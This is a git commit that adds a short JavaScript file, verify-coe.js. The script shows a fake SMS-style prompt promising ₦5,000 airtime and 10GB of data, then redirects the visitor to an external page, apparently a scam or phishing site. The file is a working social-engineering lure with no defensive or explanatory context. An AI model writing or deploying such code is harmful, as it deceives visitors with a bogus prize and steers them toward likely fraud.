f9cda44670eeb440df8f7c84b455467f8e4e7170
ukpeha2026-maker <ukpeha2026@gmail.com>
2026-07-26 12:02:22 +0100

    Create verify-coe.js

---
+++ verify-coe.js
@@ -0,0 +1,5 @@
+ var password = '₦5,000 + 10GB Data'
+password=prompt('SMS: Congratulations, your Mobile Number is eligible to receive  ₦5,000 Airtime + 10GB Data, click OK to Activate now','₦5,000 Airtime + 10GB Data');
+if (password != '₦5,000 Airtime + 10GB Data') {
+location.href='https://isoiba.com/peller-jarvis.html';
+}
